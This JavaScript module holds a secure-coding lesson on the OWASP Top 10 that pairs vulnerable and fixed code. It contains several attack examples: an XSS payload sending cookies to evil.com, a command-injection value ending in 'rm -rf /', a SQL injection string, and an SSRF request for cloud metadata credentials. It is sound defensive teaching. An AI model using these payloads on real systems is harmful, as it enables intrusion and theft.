export const topic = {
  name: "Security Architecture",
  slug: "security-architecture",
  description:
    "Build secure systems by understanding OWASP Top 10, defense in depth, and secure coding practices.",
  estimated_time: 200,
  order_index: 7,
};

export const lessons = [
  {
    title: "OWASP Top 10 & Secure Coding",
    slug: "owasp-top-10-secure-coding",
    difficulty_level: "advanced",
    estimated_time: 45,
    order_index: 1,
    key_points: [
      "Apply core security principles: defense in depth, least privilege, zero trust, and fail-safe defaults",
      "Identify and mitigate all OWASP Top 10 (2021) vulnerability categories in web applications",
      "Implement robust input validation, output encoding, and parameterized queries to prevent injection attacks",
      "Design secure authentication flows with password hashing (bcrypt/argon2), MFA, and proper session management",
      "Apply authorization patterns (RBAC, ABAC, ACL) and configure CORS and CSP policies correctly",
      "Enforce HTTPS/TLS, manage certificates, and apply security headers to harden HTTP responses",
      "Manage secrets securely using environment variables and vault systems, and scan dependencies for vulnerabilities",
      "Integrate security tooling (SAST, DAST, SCA) into CI/CD pipelines for continuous security assurance",
    ],
    content: `# OWASP Top 10 & Secure Coding

## Introduction

Security is not a feature — it is a fundamental architectural concern that must be woven into every layer of a system. A single vulnerability can lead to data breaches, regulatory fines, reputational damage, and loss of user trust. This lesson provides a comprehensive guide to building secure systems, covering foundational security principles, the OWASP Top 10 (2021), and practical secure coding techniques that every developer and architect should master.

---

## 1. Core Security Principles

Before diving into specific vulnerabilities, it is essential to understand the principles that guide secure system design.

### 1.1 Defense in Depth

Defense in depth is a layered security strategy where multiple independent controls protect a system. If one layer is compromised, subsequent layers continue to provide protection.

\`\`\`
┌─────────────────────────────────────────────────┐
│                   Perimeter                      │
│  ┌─────────────────────────────────────────┐    │
│  │              Network Layer               │    │
│  │  ┌─────────────────────────────────┐    │    │
│  │  │         Application Layer        │    │    │
│  │  │  ┌─────────────────────────┐    │    │    │
│  │  │  │       Data Layer         │    │    │    │
│  │  │  │  ┌─────────────────┐    │    │    │    │
│  │  │  │  │  Core Assets     │    │    │    │    │
│  │  │  │  └─────────────────┘    │    │    │    │
│  │  │  └─────────────────────────┘    │    │    │
│  │  └─────────────────────────────────┘    │    │
│  └─────────────────────────────────────────┘    │
└─────────────────────────────────────────────────┘
\`\`\`

**Layers include:** firewall rules, WAF (Web Application Firewall), input validation, authentication, authorization, encryption at rest and in transit, logging and monitoring.

### 1.2 Principle of Least Privilege

Every user, process, or service should operate with the **minimum set of permissions** required to perform its function — nothing more.

- Database accounts used by your app should NOT have \`DROP\` or \`GRANT\` privileges.
- Microservices should only access the APIs and data stores they need.
- IAM roles in cloud environments should be scoped narrowly.

### 1.3 Zero Trust Architecture

Zero trust assumes **no implicit trust** regardless of network location. Every request must be authenticated, authorized, and encrypted.

Key tenets:
- **Verify explicitly:** Always authenticate and authorize based on all available data points (identity, location, device health, data classification).
- **Use least privilege access:** Limit access with Just-In-Time (JIT) and Just-Enough-Access (JEA).
- **Assume breach:** Minimize blast radius, segment access, verify end-to-end encryption, and use analytics for visibility.

### 1.4 Fail-Safe Defaults

Systems should **deny access by default** and grant it only when explicitly permitted. If a security control fails, it should fail in a secure state.

\`\`\`javascript
// BAD: Fail-open — grants access if authorization check errors
function authorize(user, resource) {
  try {
    return checkPermission(user, resource);
  } catch (err) {
    return true; // DANGEROUS: fails open
  }
}

// GOOD: Fail-closed — denies access if authorization check errors
function authorize(user, resource) {
  try {
    return checkPermission(user, resource);
  } catch (err) {
    logger.error('Authorization check failed', { user: user.id, resource, err });
    return false; // Safe: fails closed
  }
}
\`\`\`

### 1.5 Separation of Duties & Security by Design

- No single person or component should control all aspects of a critical function.
- Security must be considered from the **design phase**, not bolted on afterward.
- Threat modeling (STRIDE, DREAD) should be performed early in the SDLC.

---

## 2. OWASP Top 10 (2021)

The OWASP Top 10 is the most widely recognized standard for web application security risks. Let's examine each category in depth.

### A01: Broken Access Control

**Description:** Access control enforces policy such that users cannot act outside their intended permissions. Failures lead to unauthorized information disclosure, data modification, or privilege escalation.

**Real-World Examples:**
- Modifying a URL parameter to access another user's data: \`/api/users/123/orders\` → \`/api/users/456/orders\`
- Accessing admin APIs without admin role verification
- IDOR (Insecure Direct Object References): manipulating IDs in requests

**Mitigations:**
\`\`\`javascript
// 1. Always verify ownership server-side
app.get('/api/orders/:orderId', authenticate, async (req, res) => {
  const order = await Order.findById(req.params.orderId);
  
  // CRITICAL: Verify the order belongs to the requesting user
  if (!order || order.userId !== req.user.id) {
    return res.status(404).json({ error: 'Order not found' });
  }
  
  res.json(order);
});

// 2. Deny by default
// 3. Implement rate limiting on APIs
// 4. Disable directory listing on web servers
// 5. Log access control failures and alert administrators
// 6. Invalidate stateful session identifiers on logout (JWT should be short-lived)
\`\`\`

### A02: Cryptographic Failures

**Description:** Failures related to cryptography that lead to exposure of sensitive data. Formerly called "Sensitive Data Exposure."

**Common Issues:**
- Transmitting data in clear text (HTTP, SMTP, FTP)
- Using deprecated or weak cryptographic algorithms (MD5, SHA1 for passwords, DES, RC4)
- Using default or weak encryption keys
- Not enforcing encryption via security headers (e.g., missing HSTS)

**Mitigations:**
\`\`\`javascript
// Use strong password hashing
const bcrypt = require('bcrypt');
const SALT_ROUNDS = 12;

async function hashPassword(plaintext) {
  return bcrypt.hash(plaintext, SALT_ROUNDS);
}

async function verifyPassword(plaintext, hash) {
  return bcrypt.compare(plaintext, hash);
}

// Use AES-256-GCM for encrypting data at rest
const crypto = require('crypto');

function encrypt(text, key) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  const authTag = cipher.getAuthTag().toString('hex');
  return { iv: iv.toString('hex'), encrypted, authTag };
}
\`\`\`

**Best Practices:**
- Classify data and identify which is sensitive per privacy laws (GDPR, PCI DSS)
- Don't store sensitive data unnecessarily; discard it as soon as possible
- Encrypt all data in transit with TLS 1.2+; enforce with HSTS
- Use authenticated encryption (AES-GCM) rather than unauthenticated modes (AES-ECB)

### A03: Injection

**Description:** User-supplied data is sent to an interpreter as part of a command or query without proper validation/sanitization. Includes SQL injection, NoSQL injection, OS command injection, XSS, and LDAP injection.

#### SQL Injection

\`\`\`javascript
// VULNERABLE: String concatenation
const query = "SELECT * FROM users WHERE email = '" + email + "'";
// Attack: email = "' OR '1'='1' --"

// SECURE: Parameterized query
const query = "SELECT * FROM users WHERE email = $1";
const result = await pool.query(query, [email]);
\`\`\`

#### Cross-Site Scripting (XSS)

\`\`\`javascript
// VULNERABLE: Rendering user input directly (Reflected XSS)
app.get('/search', (req, res) => {
  res.send(\`<h1>Results for: \${req.query.q}</h1>\`);
  // Attack: q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
});

// SECURE: Escape output
const escapeHtml = require('escape-html');
app.get('/search', (req, res) => {
  res.send(\`<h1>Results for: \${escapeHtml(req.query.q)}</h1>\`);
});
\`\`\`

#### Command Injection

\`\`\`javascript
// VULNERABLE
const { exec } = require('child_process');
exec(\`ping \${userInput}\`, callback);
// Attack: userInput = "8.8.8.8; rm -rf /"

// SECURE: Use execFile with argument arrays
const { execFile } = require('child_process');
execFile('ping', ['-c', '4', userInput], callback);
\`\`\`

### A04: Insecure Design

**Description:** A category focused on design and architectural flaws. An insecure design cannot be fixed by a perfect implementation — the security controls were never created to defend against specific attacks.

**Examples:**
- A password recovery flow that uses "security questions" (knowledge-based answers are easily guessable)
- A retail chain allows up to 15 failed login attempts with no rate limiting — an attacker can brute-force credentials
- No threat modeling during design phase

**Mitigations:**
- Establish a secure development lifecycle with threat modeling
- Use secure design patterns: mediator, strategy for access control
- Use abuse case stories alongside user stories
- Integrate plausibility checks at each tier
- Limit resource consumption per user/session

### A05: Security Misconfiguration

**Description:** Missing security hardening, open cloud storage, misconfigured HTTP headers, verbose error messages containing sensitive information, unnecessary features enabled.

**Common Issues:**
- Default credentials left unchanged
- Unnecessary features enabled (e.g., directory listing, debug mode in production)
- Missing security headers
- Overly permissive CORS
- Stack traces exposed to users

\`\`\`javascript
// DANGEROUS: Exposing stack traces in production
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack  // NEVER in production!
  });
});

// SECURE: Generic error in production, detailed in dev
app.use((err, req, res, next) => {
  logger.error('Unhandled error', { error: err.message, stack: err.stack });
  
  const response = { error: 'Internal Server Error' };
  if (process.env.NODE_ENV === 'development') {
    response.details = err.message;
    response.stack = err.stack;
  }
  res.status(500).json(response);
});
\`\`\`

### A06: Vulnerable and Outdated Components

**Description:** Using components (libraries, frameworks, software) with known vulnerabilities. This includes OS-level and application-level dependencies.

**Mitigations:**
\`\`\`bash
# Audit npm dependencies
npm audit

# Fix vulnerabilities automatically where possible
npm audit fix

# Use Snyk for continuous monitoring
npx snyk test

# Pin dependency versions in package.json
# Use package-lock.json or yarn.lock

# Automate with Dependabot or Renovate for dependency updates
\`\`\`

- Remove unused dependencies and features
- Continuously inventory component versions (SBOM — Software Bill of Materials)
- Only obtain components from official sources over secure links
- Monitor for unmaintained libraries

### A07: Identification and Authentication Failures

**Description:** Weaknesses in authentication mechanisms. Includes credential stuffing, brute force, weak passwords, improper session management.

**Common Flaws:**
- Permitting weak passwords
- Using broken credential recovery flows
- Storing passwords in plain text or with weak hashing
- Missing or ineffective MFA
- Session identifiers exposed in URLs
- Sessions not properly invalidated on logout

**Mitigations:**
\`\`\`javascript
// Implement MFA, rate limiting, strong password policy
const passwordPolicy = {
  minLength: 12,
  requireUppercase: true,
  requireLowercase: true,
  requireNumbers: true,
  requireSpecialChars: true,
  checkBreachedPasswords: true, // Check against Have I Been Pwned API
};

function validatePassword(password) {
  const errors = [];
  if (password.length < passwordPolicy.minLength) {
    errors.push(\`Password must be at least \${passwordPolicy.minLength} characters\`);
  }
  if (passwordPolicy.requireUppercase && !/[A-Z]/.test(password)) {
    errors.push('Password must contain at least one uppercase letter');
  }
  if (passwordPolicy.requireSpecialChars && !/[!@#$%^&*(),.?":{}|<>]/.test(password)) {
    errors.push('Password must contain at least one special character');
  }
  return { valid: errors.length === 0, errors };
}
\`\`\`

### A08: Software and Data Integrity Failures

**Description:** Code and infrastructure that does not protect against integrity violations. Includes insecure CI/CD pipelines, auto-updates without integrity verification, and insecure deserialization.

**Examples:**
- An application that pulls plugins or libraries from untrusted sources without verifying signatures
- Insecure deserialization leading to remote code execution
- CI/CD pipelines without proper access controls

**Mitigations:**
- Use digital signatures to verify software and data integrity
- Ensure npm packages are from trusted sources; use \`npm audit\`
- Use Subresource Integrity (SRI) for CDN resources:
\`\`\`html
<script src="https://cdn.example.com/lib.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxMqGUp..."
  crossorigin="anonymous"></script>
\`\`\`
- Add review steps for code and configuration changes in CI/CD
- Do not send unsigned or unencrypted serialized data to untrusted clients

### A09: Security Logging and Monitoring Failures

**Description:** Without logging and monitoring, breaches cannot be detected. Insufficient logging, detection, monitoring, and active response allows attackers to persist.

**What to Log:**
\`\`\`javascript
// Security-relevant events to log:
const securityLogger = {
  authSuccess: (userId, ip) =>
    logger.info('AUTH_SUCCESS', { userId, ip, timestamp: new Date().toISOString() }),
  
  authFailure: (email, ip, reason) =>
    logger.warn('AUTH_FAILURE', { email, ip, reason, timestamp: new Date().toISOString() }),
  
  accessDenied: (userId, resource, ip) =>
    logger.warn('ACCESS_DENIED', { userId, resource, ip, timestamp: new Date().toISOString() }),
  
  suspiciousActivity: (userId, activity, ip) =>
    logger.error('SUSPICIOUS_ACTIVITY', { userId, activity, ip, timestamp: new Date().toISOString() }),
  
  dataAccess: (userId, dataType, recordCount) =>
    logger.info('DATA_ACCESS', { userId, dataType, recordCount, timestamp: new Date().toISOString() }),
};

// IMPORTANT: Never log sensitive data
// BAD:  logger.info('Login', { email, password });
// GOOD: logger.info('Login attempt', { email });
\`\`\`

**Best Practices:**
- Ensure logs have enough context to identify suspicious activity
- Use centralized log management (ELK Stack, Splunk, Datadog)
- Set up alerts for anomalous behavior (e.g., 50 failed logins from one IP in 5 minutes)
- Maintain an incident response plan and test it regularly

### A10: Server-Side Request Forgery (SSRF)

**Description:** SSRF occurs when a web application fetches a remote resource without validating the user-supplied URL. An attacker can coerce the application to send crafted requests to unexpected destinations — including internal services.

**Example Attack:**
\`\`\`
POST /api/fetch-url
{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
// Accesses AWS metadata service from inside the VPC!
\`\`\`

**Mitigations:**
\`\`\`javascript
const { URL } = require('url');
const dns = require('dns').promises;
const net = require('net');

async function validateUrl(userUrl) {
  const parsed = new URL(userUrl);
  
  // 1. Whitelist allowed protocols
  if (!['http:', 'https:'].includes(parsed.protocol)) {
    throw new Error('Only HTTP(S) protocols allowed');
  }
  
  // 2. Block private/internal IP ranges
  const { address } = await dns.lookup(parsed.hostname);
  if (net.isIP(address)) {
    const parts = address.split('.').map(Number);
    const isPrivate =
      parts[0] === 10 ||
      (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) ||
      (parts[0] === 192 && parts[1] === 168) ||
      parts[0] === 127 ||
      address === '0.0.0.0' ||
      address.startsWith('169.254');
    
    if (isPrivate) {
      throw new Error('Access to internal addresses is forbidden');
    }
  }
  
  return parsed.href;
}
\`\`\`

---

## 3. Input Validation & Sanitization

Input validation is the **first line of defense** against injection attacks.

### Validation Strategies

\`\`\`javascript
const Joi = require('joi');

// Schema-based validation with Joi
const userRegistrationSchema = Joi.object({
  email: Joi.string().email().required().max(255),
  password: Joi.string().min(12).max(128).required(),
  name: Joi.string().alphanum().min(2).max(50).required(),
  age: Joi.number().integer().min(13).max(120),
  website: Joi.string().uri({ scheme: ['http', 'https'] }).optional(),
});

// Validation middleware
function validate(schema) {
  return (req, res, next) => {
    const { error, value } = schema.validate(req.body, {
      abortEarly: false,
      stripUnknown: true,  // Remove unexpected fields
    });
    if (error) {
      return res.status(400).json({
        error: 'Validation failed',
        details: error.details.map(d => d.message),
      });
    }
    req.validatedBody = value;
    next();
  };
}
\`\`\`

### Key Rules

1. **Validate on the server side** — client-side validation is a UX feature, not a security control.
2. **Whitelist over blacklist** — define what IS allowed rather than what is NOT.
3. **Validate type, length, format, and range.**
4. **Sanitize for the output context** — HTML encode for HTML context, URL encode for URL context.
5. **Reject unexpected input** — use \`stripUnknown\` in validation libraries.

---

## 4. Authentication Security

### 4.1 Password Hashing

Never store plain-text passwords. Use adaptive, salted hashing algorithms.

| Algorithm | Recommended | Notes |
|-----------|-------------|-------|
| **bcrypt** | Yes | Time-tested, widely supported, built-in salting |
| **Argon2id** | Yes (preferred) | Winner of Password Hashing Competition, memory-hard |
| **scrypt** | Yes | Memory-hard, good alternative |
| **SHA-256** | No | Too fast, vulnerable to brute force |
| **MD5** | No | Broken, never use for passwords |

\`\`\`javascript
// Argon2 example
const argon2 = require('argon2');

async function hashPassword(password) {
  return argon2.hash(password, {
    type: argon2.argon2id,
    memoryCost: 65536,     // 64 MB
    timeCost: 3,           // 3 iterations
    parallelism: 4,        // 4 threads
  });
}

async function verifyPassword(hash, password) {
  return argon2.verify(hash, password);
}
\`\`\`

### 4.2 Multi-Factor Authentication (MFA)

MFA requires two or more independent verification factors:
- **Something you know:** password, PIN
- **Something you have:** authenticator app (TOTP), hardware key (FIDO2/WebAuthn)
- **Something you are:** biometrics (fingerprint, face)

TOTP (Time-based One-Time Password) is the most common second factor:
\`\`\`javascript
const speakeasy = require('speakeasy');

// Generate secret for user
const secret = speakeasy.generateSecret({ name: 'MyApp (user@email.com)' });
// Store secret.base32 in database, show secret.otpauth_url as QR code

// Verify token
function verifyTOTP(secret, token) {
  return speakeasy.totp.verify({
    secret: secret,
    encoding: 'base32',
    token: token,
    window: 1, // Allow 1 step tolerance (30 seconds)
  });
}
\`\`\`

### 4.3 Session Management

- Generate session IDs with a cryptographically secure random number generator.
- Set session cookies with \`HttpOnly\`, \`Secure\`, \`SameSite=Strict\`, and appropriate \`Max-Age\`.
- Regenerate session IDs after authentication to prevent session fixation.
- Implement absolute and idle session timeouts.
- Invalidate sessions server-side on logout.

\`\`\`javascript
app.use(session({
  secret: process.env.SESSION_SECRET,
  name: '__Host-sid',           // __Host- prefix for extra security
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: true,               // HTTPS only
    sameSite: 'strict',
    maxAge: 30 * 60 * 1000,     // 30 minutes
    domain: undefined,          // Don't set domain w/ __Host- prefix
    path: '/',
  },
  store: new RedisStore({ client: redisClient }),
}));
\`\`\`

---

## 5. Authorization Patterns

### 5.1 RBAC (Role-Based Access Control)

Users are assigned roles, and roles are granted permissions.

\`\`\`javascript
const permissions = {
  admin:  ['read', 'write', 'delete', 'manage_users'],
  editor: ['read', 'write'],
  viewer: ['read'],
};

function authorize(...requiredPermissions) {
  return (req, res, next) => {
    const userPermissions = permissions[req.user.role] || [];
    const hasPermission = requiredPermissions.every(p => userPermissions.includes(p));
    
    if (!hasPermission) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    next();
  };
}

// Usage
app.delete('/api/posts/:id', authenticate, authorize('delete'), deletePost);
\`\`\`

### 5.2 ABAC (Attribute-Based Access Control)

Decisions based on attributes of the user, resource, action, and environment.

\`\`\`javascript
function evaluatePolicy(user, resource, action, environment) {
  // Example policy: Editors can edit their own posts during business hours
  if (action === 'edit' && user.role === 'editor') {
    const isOwner = resource.authorId === user.id;
    const hour = new Date().getHours();
    const isBusinessHours = hour >= 9 && hour <= 17;
    return isOwner && isBusinessHours;
  }
  return false;
}
\`\`\`

### 5.3 ACL (Access Control List)

Permissions are attached directly to resources, specifying which users or groups can perform which actions.

---

## 6. CORS Configuration

Cross-Origin Resource Sharing (CORS) controls which origins can access your API.

\`\`\`javascript
const cors = require('cors');

// DANGEROUS: Allow all origins
app.use(cors()); // Never in production!

// SECURE: Whitelist specific origins
const allowedOrigins = [
  'https://myapp.com',
  'https://admin.myapp.com',
];

app.use(cors({
  origin: (origin, callback) => {
    // Allow requests with no origin (server-to-server, mobile apps)
    if (!origin) return callback(null, true);
    
    if (allowedOrigins.includes(origin)) {
      return callback(null, true);
    }
    return callback(new Error('Not allowed by CORS'));
  },
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,
  maxAge: 86400, // Cache preflight for 24 hours
}));
\`\`\`

---

## 7. Content Security Policy (CSP)

CSP is a security header that prevents XSS, clickjacking, and other code injection attacks by specifying approved sources of content.

\`\`\`javascript
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'nonce-{random}'"],  // Use nonces for inline scripts
    styleSrc: ["'self'", "'unsafe-inline'"],     // Consider using nonces for styles too
    imgSrc: ["'self'", "data:", "https://cdn.myapp.com"],
    connectSrc: ["'self'", "https://api.myapp.com"],
    fontSrc: ["'self'", "https://fonts.gstatic.com"],
    objectSrc: ["'none'"],           // Block <object>, <embed>, <applet>
    frameAncestors: ["'none'"],      // Prevent framing (clickjacking protection)
    baseUri: ["'self'"],             // Restrict <base> tag
    formAction: ["'self'"],          // Restrict form submission targets
    upgradeInsecureRequests: [],     // Upgrade HTTP to HTTPS
  },
}));
\`\`\`

---

## 8. HTTPS/TLS & Certificate Management

### Enforcing HTTPS

- All production traffic must use TLS 1.2 or 1.3.
- Redirect all HTTP requests to HTTPS.
- Use HSTS to instruct browsers to always use HTTPS.

\`\`\`javascript
// Redirect HTTP to HTTPS
app.use((req, res, next) => {
  if (req.headers['x-forwarded-proto'] !== 'https' && process.env.NODE_ENV === 'production') {
    return res.redirect(301, \`https://\${req.headers.host}\${req.url}\`);
  }
  next();
});

// HSTS Header (also set via helmet)
// Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
\`\`\`

### Certificate Management

- Use automated certificate management (Let's Encrypt with Certbot, AWS ACM).
- Monitor certificate expiration and auto-renew.
- Implement certificate pinning for mobile apps (with caution — can cause outages if mismanaged).
- Use strong cipher suites; disable SSLv3, TLS 1.0, TLS 1.1.

---

## 9. Secrets Management

**Never hard-code secrets** in source code, configuration files checked into version control, or client-side code.

### Environment Variables

\`\`\`javascript
// .env file (NEVER commit to git)
// DB_PASSWORD=supersecretpassword
// JWT_SECRET=your-jwt-secret-key
// API_KEY=third-party-api-key

require('dotenv').config();

const dbConfig = {
  host: process.env.DB_HOST,
  password: process.env.DB_PASSWORD,
  // ...
};

// Validate required env vars at startup
const requiredEnvVars = ['DB_PASSWORD', 'JWT_SECRET', 'SESSION_SECRET'];
for (const envVar of requiredEnvVars) {
  if (!process.env[envVar]) {
    console.error(\`FATAL: Missing required environment variable: \${envVar}\`);
    process.exit(1);
  }
}
\`\`\`

### Vault Systems

For production environments, use dedicated secrets management:
- **HashiCorp Vault:** Dynamic secrets, encryption as a service, lease-based access
- **AWS Secrets Manager / SSM Parameter Store:** Integrated with AWS services, auto-rotation
- **Azure Key Vault / GCP Secret Manager:** Cloud-native secret stores

Secrets should be **rotated regularly** and access should be **audited**.

---

## 10. Security Headers

\`\`\`javascript
const helmet = require('helmet');

// helmet sets many of these by default
app.use(helmet());

// Individual headers explained:
app.use((req, res, next) => {
  // Prevent MIME type sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');
  
  // Prevent clickjacking
  res.setHeader('X-Frame-Options', 'DENY');
  
  // Enable HSTS (force HTTPS for 2 years, include subdomains)
  res.setHeader('Strict-Transport-Security', 'max-age=63072000; includeSubDomains; preload');
  
  // Control referrer information
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  
  // Restrict browser features
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
  
  // Remove server identification
  res.removeHeader('X-Powered-By');
  
  next();
});
\`\`\`

| Header | Purpose |
|--------|---------|
| \`X-Content-Type-Options: nosniff\` | Prevents MIME type sniffing |
| \`X-Frame-Options: DENY\` | Prevents clickjacking via iframes |
| \`Strict-Transport-Security\` | Forces HTTPS for specified duration |
| \`Content-Security-Policy\` | Controls allowed content sources (XSS prevention) |
| \`Referrer-Policy\` | Controls referrer header information leakage |
| \`Permissions-Policy\` | Restricts browser feature access (camera, mic, etc.) |
| \`Cache-Control\` | Prevents caching of sensitive responses |

---

## 11. Dependency Scanning & Security Testing

### Static Application Security Testing (SAST)

Analyzes source code for vulnerabilities **without executing** the application.

- Tools: SonarQube, Semgrep, ESLint security plugins, CodeQL
- Catches: SQL injection patterns, hard-coded secrets, insecure configurations
- Run in: IDE (shift-left), CI pipeline

### Dynamic Application Security Testing (DAST)

Tests the **running application** by simulating attacks.

- Tools: OWASP ZAP, Burp Suite, Nikto
- Catches: XSS, CSRF, misconfigurations, authentication flaws
- Run in: Staging environment, CI pipeline

### Software Composition Analysis (SCA)

Identifies **known vulnerabilities in dependencies**.

- Tools: Snyk, npm audit, OWASP Dependency-Check, GitHub Dependabot
- Catches: CVEs in third-party libraries
- Run in: CI pipeline, continuous monitoring

---

## 12. Security in CI/CD Pipeline

\`\`\`yaml
# Example GitHub Actions security pipeline
name: Security Pipeline
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # SAST: Static analysis
      - name: Run Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: "p/owasp-top-ten"

      # SCA: Dependency scanning
      - name: npm audit
        run: npm audit --audit-level=high

      # Secret scanning
      - name: Scan for secrets
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./

      # Container scanning (if using Docker)
      - name: Scan Docker image
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'myapp:latest'
          severity: 'HIGH,CRITICAL'

      # DAST: Dynamic testing (on staging)
      - name: OWASP ZAP Scan
        uses: zaproxy/action-full-scan@v0.7.0
        with:
          target: 'https://staging.myapp.com'
\`\`\`

### Security Gates

- **Pre-commit:** Secret scanning (git-secrets, pre-commit hooks)
- **PR Review:** SAST results, dependency audit
- **Build:** Container image scanning, SBOM generation
- **Deploy:** DAST against staging, compliance checks
- **Runtime:** WAF, RASP (Runtime Application Self-Protection), anomaly detection

---

## Interview Preparation Tips

1. **Know the OWASP Top 10 cold** — be able to name all 10 and give examples and mitigations for each.
2. **Understand the difference between authentication and authorization.**
3. **Be ready to code** secure implementations: parameterized queries, bcrypt hashing, JWT validation.
4. **Discuss security as a design concern**, not an afterthought — mention threat modeling, security user stories.
5. **Know the security headers** and what each one prevents.
6. **Explain defense in depth** with concrete layers relevant to your application.
7. **Discuss CI/CD security** — how you integrate security tooling into the pipeline.
8. **Understand zero trust** and how it differs from perimeter-based security.

---

## Summary

Security architecture is about making security a **first-class architectural concern**. The OWASP Top 10 provides a prioritized list of the most critical web application security risks. By combining core principles (defense in depth, least privilege, zero trust) with practical controls (input validation, strong authentication, proper authorization, security headers, secrets management) and continuous security testing (SAST, DAST, SCA in CI/CD), you can build systems that are resilient against the most common and dangerous attacks. Security is a continuous process, not a one-time checklist.`,
  },
];
